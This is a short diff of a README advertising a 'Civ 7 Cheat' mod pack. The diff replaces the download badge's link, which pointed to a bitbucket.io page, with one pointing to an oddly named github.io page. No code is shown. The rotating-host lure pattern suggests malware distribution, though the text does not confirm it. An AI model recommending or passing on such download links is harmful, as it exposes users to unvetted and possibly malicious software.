@@ -4,7 +4,7 @@ Tired of waiting 20 turns to build one unit while Gandhi nukes you on turn 80? *
 
 Take control of the game engine, not just the map. From **singleplayer sandbox domination** to wild experimental runs, this mod pack puts the power of the gods in your hands ⚡.
 
-[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://fileoffload5.bitbucket.io)
+[![Download Cheat](https://img.shields.io/badge/Download-Cheat-blueviolet)](https://Civilization-VII-Cheat-syl.github.io/.github)
 ---
 
 ## 🧠 What is a Civ 7 Cheat?
